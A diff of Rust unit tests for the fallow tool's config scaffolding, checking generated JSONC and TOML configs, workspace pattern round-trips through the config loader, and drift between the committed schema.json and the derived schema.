+        let info = ProjectInfo {
+            is_monorepo: false,
+            workspace_patterns: Vec::new(),
+            workspace_tool: None,
+            has_typescript: false,
+            test_framework: None,
+            ui_framework: None,
+            has_storybook: false,
+            package_manager: None,
+            test_framework_ambiguous: false,
+            has_local_schema: false,
+        };
+        let json = build_json_config(&info);
+        // Guards against a silent no-op of `insert_json_header_comment` if the
+        // `$schema`-first anchor ever changes.
+        let comment = json
+            .find("// This file is JSONC: fallow reads these comments; generic JSON tools may not.")
+            .expect("generated .fallowrc.json must carry the JSONC-provenance header comment");
+        let schema = json.find("\"$schema\"").expect("$schema key present");
+        assert!(comment < schema, "header comment must precede $schema");
     }
 
     #[test]
@@ -972,6 +2111,9 @@ mod tests {
             test_framework: None,
             ui_framework: None,
             has_storybook: false,
+            package_manager: None,
+            test_framework_ambiguous: false,
+            has_local_schema: false,
         };
         let json = build_json_config(&info);
         assert!(json.contains("{ts,tsx,js,jsx}"));
@@ -987,12 +2129,15 @@ mod tests {
             test_framework: None,
             ui_framework: None,
             has_storybook: false,
+            package_manager: None,
+            test_framework_ambiguous: false,
+            has_local_schema: false,
         };
         let json = build_json_config(&info);
-        let parsed: serde_json::Value = serde_json::from_str(&json).unwrap();
-        assert!(parsed["workspaces"]["packages"].is_array());
-        let packages = parsed["workspaces"]["packages"].as_array().unwrap();
-        assert_eq!(packages.len(), 2);
+        let parsed = parse_jsonc_config(&json);
+        assert!(parsed["workspaces"]["patterns"].is_array());
+        let patterns = parsed["workspaces"]["patterns"].as_array().unwrap();
+        assert_eq!(patterns.len(), 2);
     }
 
     #[test]
@@ -1005,9 +2150,12 @@ mod tests {
             test_framework: None,
             ui_framework: None,
             has_storybook: true,
+            package_manager: None,
+            test_framework_ambiguous: false,
+            has_local_schema: false,
         };
         let json = build_json_config(&info);
-        let parsed: serde_json::Value = serde_json::from_str(&json).unwrap();
+        let parsed = parse_jsonc_config(&json);
         let ignore = parsed["ignorePatterns"].as_array().unwrap();
         assert!(ignore.iter().any(|v| v == ".storybook/**"));
     }
@@ -1022,9 +2170,12 @@ mod tests {
             test_framework: Some("Vitest".to_string()),
             ui_framework: None,
             has_storybook: false,
+            package_manager: None,
+            test_framework_ambiguous: false,
+            has_local_schema: false,
         };
         let json = build_json_config(&info);
-        let parsed: serde_json::Value = serde_json::from_str(&json).unwrap();
+        let parsed = parse_jsonc_config(&json);
         assert_eq!(parsed["rules"]["unused-dependencies"], "warn");
     }
 
@@ -1038,10 +2189,82 @@ mod tests {
             test_framework: None,
             ui_framework: None,
             has_storybook: false,
+            package_manager: None,
+            test_framework_ambiguous: false,
+            has_local_schema: false,
         };
         let toml = build_toml_config(&info);
         assert!(toml.contains("[workspaces]"));
-        assert!(toml.contains("packages = [\"packages/*\"]"));
+        assert!(
+            toml.contains("patterns = [\"packages/*\"]"),
+            "monorepo TOML must use the loader's `patterns` key, not `packages`"
+        );
+    }
+
+    /// The generated JSON scaffold (also the `fallow fix` missing-config seed via
+    /// `init::build_json_config`, see `fix/config.rs`) must LOAD through the real
+    /// config loader, not merely parse as JSONC. A monorepo's workspace patterns
+    /// must survive the round-trip under the correct `patterns` key.
+    #[test]
+    fn init_json_output_loads_through_real_loader() {
+        let dir = tempfile::tempdir().unwrap();
+        let root = dir.path();
+        let info = ProjectInfo {
+            is_monorepo: true,
+            workspace_patterns: vec!["packages/*".to_string(), "apps/*".to_string()],
+            workspace_tool: Some("pnpm".to_string()),
+            has_typescript: true,
+            test_framework: Some("Vitest".to_string()),
+            ui_framework: None,
+            has_storybook: true,
+            package_manager: Some("pnpm".to_string()),
+            test_framework_ambiguous: false,
+            has_local_schema: false,
+        };
+        // The filename extension drives format detection, so this MUST be a real
+        // config name (`.fallowrc.json`); an arbitrary name would be parsed as TOML.
+        let path = root.join(".fallowrc.json");
+        std::fs::write(&path, build_json_config(&info)).unwrap();
+        let config = FallowConfig::load(&path)
+            .unwrap_or_else(|e| panic!("init JSON scaffold must load through the loader: {e:?}"));
+        assert_eq!(
+            config.workspaces.map(|w| w.patterns).unwrap_or_default(),
+            info.workspace_patterns,
+            "workspace patterns must survive the round-trip"
+        );
+    }
+
+    /// The generated TOML scaffold must LOAD through the real config loader with
+    /// its workspace patterns preserved end-to-end (which the string-shape
+    /// assertion in `toml_config_monorepo_includes_workspaces` does not cover).
+    /// That sibling test pins the exact key the scaffold writes (`patterns`);
+    /// because `packages` is now a back-compat serde alias, this loader test would
+    /// still pass on the old key, so the sibling string assertion is the format guard.
+    #[test]
+    fn init_toml_output_loads_and_preserves_workspaces() {
+        let dir = tempfile::tempdir().unwrap();
+        let root = dir.path();
+        let info = ProjectInfo {
+            is_monorepo: true,
+            workspace_patterns: vec!["packages/*".to_string()],
+            workspace_tool: Some("pnpm".to_string()),
+            has_typescript: true,
+            test_framework: None,
+            ui_framework: None,
+            has_storybook: false,
+            package_manager: None,
+            test_framework_ambiguous: false,
+            has_local_schema: false,
+        };
+        let path = root.join("fallow.toml");
+        std::fs::write(&path, build_toml_config(&info)).unwrap();
+        let config = FallowConfig::load(&path)
+            .unwrap_or_else(|e| panic!("init TOML scaffold must load through the loader: {e:?}"));
+        assert_eq!(
+            config.workspaces.map(|w| w.patterns).unwrap_or_default(),
+            info.workspace_patterns,
+            "workspace patterns must survive the round-trip under the `patterns` key"
+        );
     }
 
     #[test]
@@ -1054,9 +2277,14 @@ mod tests {
             test_framework: None,
             ui_framework: None,
             has_storybook: true,
+            package_manager: None,
+            test_framework_ambiguous: false,
+            has_local_schema: false,
         };
         let toml = build_toml_config(&info);
         assert!(toml.contains("ignorePatterns = [\".storybook/**\"]"));
+        assert!(toml.contains("[duplicates]"));
+        assert!(toml.contains("#   \"**/lib/**\""));
     }
 
     #[test]
@@ -1074,8 +2302,8 @@ mod tests {
         assert_eq!(exit, ExitCode::SUCCESS);
 
         let content = std::fs::read_to_string(root.join(".fallowrc.json")).unwrap();
-        let parsed: serde_json::Value = serde_json::from_str(&content).unwrap();
-        assert!(parsed["workspaces"]["packages"].is_array());
+        let parsed = parse_jsonc_config(&content);
+        assert!(parsed["workspaces"]["patterns"].is_array());
         assert!(content.contains("{ts,tsx,js,jsx}"));
     }
 
@@ -1095,5 +2323,69 @@ mod tests {
         let content = std::fs::read_to_string(root.join("fallow.toml")).unwrap();
         assert!(content.contains("[workspaces]"));
         assert!(content.contains("apps/*"));
+    }
+}
+
+#[cfg(test)]
+mod config_schema_drift {
+    //! Drift gate for the committed root `schema.json` (the JSON Schema for
+    //! `.fallowrc.json`). Mirrors the `docs/output-schema.json` drift gate in
+    //! `crates/cli/src/bin/schema_emit.rs` but is much simpler because
+    //! `schema.json` is fully derived from `FallowConfig::json_schema()` with
+    //! no hand-written sections to merge: the committed file is the literal
+    //! pretty-printed serde_json output of [`FallowConfig::json_schema`].
+    //!
+    //! On failure, regenerate via:
+    //!   cargo run --bin fallow -- config-schema > schema.json
+    //!
+    //! The CI `rust:` paths-filter at `.github/workflows/ci.yml` also matches
+    //! edits to `schema.json` directly, so a PR that only touches the
+    //! committed schema still triggers this test rather than slipping through
+    //! to a push-time failure on main.
+
+    use super::FallowConfig;
+
+    /// Embedded copy of the committed root `schema.json`. `include_str!`
+    /// paths must resolve INSIDE the crates.io tarball, which contains only
+    /// `crates/cli/`. The workspace root's `schema.json` is mirrored into
+    /// `crates/cli/schema.json` via a git symlink; `cargo package`
+    /// dereferences the symlink into a regular file inside the published
+    /// tarball, so both local dev and the published crate stay
+    /// self-contained. This mirrors the GitLab CI template bundling pattern
+    /// in `crates/cli/src/ci_template.rs`. Contributors edit
+    /// `<workspace>/schema.json` only; the symlink picks the new bytes up
+    /// automatically.
+    const COMMITTED: &str = include_str!("../schema.json");
+
+    #[test]
+    fn schema_json_in_sync_with_derived() {
+        let derived = FallowConfig::json_schema();
+        assert!(
+            derived.is_object(),
+            "FallowConfig::json_schema() did not produce a JSON object (got `{derived}`); \
+             schemars or serde_json may have regressed."
+        );
+
+        let committed: serde_json::Value =
+            serde_json::from_str(COMMITTED).expect("committed schema.json must parse as JSON");
+
+        assert_eq!(
+            committed, derived,
+            "\nschema.json drift detected.\n\
+             Regenerate: cargo run --bin fallow -- config-schema > schema.json\n\
+             Usually triggered by edits to #[derive(JsonSchema)] structs or /// docstrings in crates/config/.\n"
+        );
+    }
+
+    /// Issue #1794: `fallow.dev` never resolved in DNS. Guards against
+    /// reintroducing the dead domain into the `$schema` doc comment (which
+    /// schemars surfaces verbatim into `schema.json`'s description field).
+    #[test]
+    fn schema_json_has_no_dead_fallow_dev_reference() {
+        assert!(
+            !COMMITTED.contains("fallow.dev"),
+            "schema.json must not reference the dead fallow.dev domain; \
+             use ./node_modules/fallow/schema.json or the raw.githubusercontent.com fallback"
+        );
     }
 }
